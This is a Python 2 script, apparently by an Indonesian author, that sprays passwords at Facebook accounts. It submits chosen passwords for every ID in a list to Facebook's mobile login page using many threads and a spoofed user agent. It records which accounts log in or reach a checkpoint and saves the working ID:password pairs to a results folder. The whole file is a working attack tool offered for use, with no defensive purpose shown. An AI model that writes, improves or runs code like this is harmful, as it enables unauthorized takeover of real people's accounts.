import random
import os
import requests
import re
import readline
import sys
import argparse
import time
import random
from multiprocessing.pool import ThreadPool
from datetime import timedelta

url = 'https://mbasic.facebook.com/login.php'
user_agent = my_user_agent = 'Mozilla/5.0 (Linux; Android 7.0; 5060 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36'

reload(sys)
sys.setdefaultencoding('utf-8')

# handle ctrl-C not working
class KeyboardInterruptError(Exception):
    pass

class crack:
    def __init__(self, filename, pw, th):
        self.id_list = [i.strip() for i in open(filename).readlines() if i.strip() != '' and i]
        if arg.reverse:
            self.id_list = self.id_list[::-1]
        if arg.jumlah:
            self.id_list = self.id_list[:arg.jumlah]
        self.pw = pw
        # <-- data result -->
        self.data = {'berhasil': [],
                     'checkpoint': [],
                     'gagal': []}
        self.t = 0
        self.raw = 0

        self.start = time.time()
        p = ThreadPool(int(th))
        try:
            p.map_async(self.run, self.id_list).get(9999)
        except KeyboardInterrupt:
            p.close()
        except Exception as e:
            p.terminate()
        self.print_data()
        p.close()

    def updt(self, progress, total, barLength=25, indi='#'):
        if total < progress:
            raise ValueError('progress is greater than total')

        elapsed = time.time() - self.start
        progress_ = float(progress) / float(total)
        block = int(round(barLength * progress_))
        text = "\r{0} [{1}] {2:.0f}% ({3}/{4} {5}) ".format(
            str(timedelta(seconds=elapsed)).split('.')[0],
            indi * block + "-" * (barLength - block),
            round(progress_ * 100, 0),
            progress, total, self.convertSize(self.raw)
           )
        sys.stdout.write(text)
        sys.stdout.flush()

    def convertSize(self, n, format='%(value).1f %(symbol)s', symbols='customary'):
        SYMBOLS = {
            'customary': ('B', 'K', 'Mb', 'G', 'T', 'P', 'E', 'Z', 'Y'),
            'customary_ext': ('byte', 'kilo', 'mega', 'giga', 'tera', 'peta', 'exa',
                              'zetta', 'iotta'),
            'iec': ('Bi', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi', 'Yi'),
            'iec_ext': ('byte', 'kibi', 'mebi', 'gibi', 'tebi', 'pebi', 'exbi',
                        'zebi', 'yobi'),
            }
        n = int(n)
        if n < 0:
            raise ValueError("n < 0")
        symbols = SYMBOLS[symbols]
        prefix = {}
        for i, s in enumerate(symbols[1:]):
            prefix[s] = 1 << (i + 1) * 10
        for symbol in reversed(symbols[1:]):
            if n >= prefix[symbol]:
                value = float(n) / prefix[symbol]
                return format % locals()

        return format % dict(symbol=symbols[0], value=n)

    def run(self, id):
        s = requests.Session()
        try:
            r = s.post(url,
                       data={'email': id, 'pass': self.pw},
                       headers={'User-Agent': user_agent})
            if re.search('(?:m_sess|home.php)', r.url):
                self.data['berhasil'].append(id)
            elif 'checkpoint' in r.url:
                self.data['checkpoint'].append(id)
            else:
                self.data['gagal'].append(id)
        except KeyboardInterrupt:
            raise KeyboardInterruptError()
        except Exception:
            self.data['gagal'].append(id)
        self.raw += len(r.text)
        self.t += 1
        self.updt(self.t, len(self.id_list))

    def print_data(self):
        print '\n'
        color = {'berhasil': '32', 'checkpoint': '33', 'gagal': '31'}
        for i in ['berhasil', 'checkpoint', 'gagal']:
            print '\x1b[{0}m# {1:<10}\x1b[0m -> \x1b[36m{2}\x1b[0m'.format(color[i], i, len(self.data[i]))
            if len(self.data[i]) > 0 and i != 'gagal':
                for x in self.data[i]:
                    self.save_(i, x)
                    print '  -> {}:{}'.format(x, self.pw)
        print ''

    def save_(self, x, y):
        with open('{}/hasil/{}.txt'.format(os.environ['HOME'], x), 'a') as f:
            f.write('{}:{}\n'.format(y, self.pw))

def main():
    global arg

    parser = argparse.ArgumentParser()
    parser.add_argument('sandi', nargs='*', help='kata sandi yang akan digunakan, maksimal 10')
    parser.add_argument('-p', dest='path', help='letak id list yang akan di-Crack / dicek', required=True)
    parser.add_argument('-t', dest='thread', help='jumlah thread, (default 20)', default=20, type=int)
    parser.add_argument('-l', dest='jumlah', help='jumlah list yang akan diambil (index all)', type=int)
    parser.add_argument('-r', '--reverse', action='store_true', help='mulai dari value paling belakang')
    arg = parser.parse_args()

    if not os.path.isdir(os.path.join(os.environ['HOME'], 'hasil')):
        os.mkdir('{}/{}'.format(os.environ['HOME'], 'hasil'))
    if not os.path.isfile(arg.path):
        sys.exit('!: file tidak ditemukan %s' % arg.path)
    if arg.sandi:
        print '!: author Val (zvtyrdt.id)\n!: homepage https://github.com/zevtyardt\n!: fb https://m.facebook.com/zvtyrdt.id\n'
        if len(arg.sandi) > 10:
            arg.sandi = arg.sandi[:10]
        for s in arg.sandi:
            print '!: jumlah pekerja yang digunakan {0}\n!: kata sandi yang digunakan {1}\n\n!: memulai meng-Crack akun..'.format(arg.thread, s)
            crack(arg.path, s, arg.thread)
    else:
        parser.print_usage()

if __name__ == '__main__':
    main()